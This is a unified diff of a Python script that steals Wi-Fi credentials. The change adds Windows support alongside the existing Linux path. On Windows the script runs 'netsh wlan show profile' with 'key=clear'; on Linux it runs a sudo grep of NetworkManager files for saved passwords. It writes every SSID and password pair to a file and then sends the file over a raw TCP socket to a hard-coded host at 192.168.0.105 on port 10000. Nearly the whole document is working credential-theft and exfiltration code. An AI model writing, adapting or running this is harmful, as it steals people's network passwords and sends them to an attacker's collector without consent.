@@ -1,72 +1,102 @@
-# Collect all creds	Done
-# Create a file
-# Get file size
-# Send file size
-# send file contents
-
-
-import uuid
 import os
 import re
-import sys
 import socket
 import subprocess
+import sys
+import uuid
 
+COMMAND_WINDOWS = "netsh wlan show profile"
 COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
 RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
 MAC=''
 OS=''
-
+serversocket=''
 
 def main():
-    identify()
-    store_data()
-    establish_connection()
-    send_data()
-    close_connection()
+	identify()
+	store_data()
+	establish_connection()
+	send_data()
+	close_connection()
 
 
 def identify():
-    global MAC,OS
-    MAC = hex(uuid.getnode())
-    OS  = sys.platform
-    print(" OS => ",OS)
+	global MAC,OS
+	MAC=str((hex(uuid.getnode())))
+	OS = sys.platform
 
 def store_data():
-    file = open(MAC,'w')
-    # output is a list of all SSID-psk combo
-    output = subprocess.check_output(COMMAND_LINUX,shell=True).decode('ascii').split('\n')
-    for pair in output:
-        try:
-            pair = re.findall(RE_LINUX,pair)[0].split(':')
-            ssid = pair[0]
-            psk  = pair[1].split('=')[1]
-            file.write(ssid+','+psk+'\n')
-        except:
-            pass
+	file = open(MAC,'w')
 
-    file.close()
+	if OS == 'win32':
+		output = subprocess.check_output(COMMAND_WINDOWS).decode('ascii').split('\n')
+		SSID = list()
+	# Get SSIDs
+		for name in output:
+			try:
+				Name = name.split(':')[1].strip() #strip() removes a leading whitespace and following '\r' character
+				SSID.append(Name)
+			except:
+				pass
+
+		# Get PSK of each SSID
+		# SSID[0]=<blank> which when given to below check_output() causes error . 
+		# So the try except handles it
+		for ssid in SSID:
+			try:
+				Password = subprocess.check_output(COMMAND_WINDOWS+' name="'+ssid+'" key=clear').decode('ascii')
+				PSK      = re.findall('Key Content(.*)\n',Password)[0].strip().split(':')[1].strip()
+				file.write(ssid+','+PSK+'\n')
+				#print(ssid,'	',PSK)
+			except:
+				pass
+
+	elif OS == "linux":
+		output = subprocess.check_output(COMMAND_LINUX,shell=True).decode('ascii').split('\n')
+		for pair in output:
+			try:
+				pair = re.findall(RE_LINUX,pair)[0].split(':')
+				ssid = pair[0]
+				psk  = pair[1].split('=')[1]
+				file.write(ssid+','+psk+'\n')
+			except:
+				pass
+
+	else:
+		print("No support for this OS as yet !!")
+
+
+	file.close()
+
+
+
 
 
 def establish_connection():
-    global serversocket
-    serversocket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-    server_address = ('192.168.0.105',10000)
-    serversocket.connect(server_address)
-
+	global serversocket
+	try:
+		serversocket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+		server_address = ('192.168.0.105',10000)
+		serversocket.connect(server_address)
+	except:
+		print("Sorry , couldn't establish connection successfully ")
+		exit(1)
 
 
 def send_data():
-    serversocket.send(MAC.encode('ascii'))
+	serversocket.send(MAC.encode('ascii'))
 
-    file = open(MAC,'r')
-    CONTENT = file.read()
-    serversocket.send(CONTENT.encode('ascii'))
+	file = open(MAC,'r')
+	CONTENT = file.read()
+	serversocket.send(CONTENT.encode('ascii'))
 
-    file.close()
+	file.close()
+
+
 
 def close_connection():
-    serversocket.close()
+	serversocket.close()
 
-if __name__ == "__main__":
-    main()
+
+if __name__ == '__main__':
+	main()
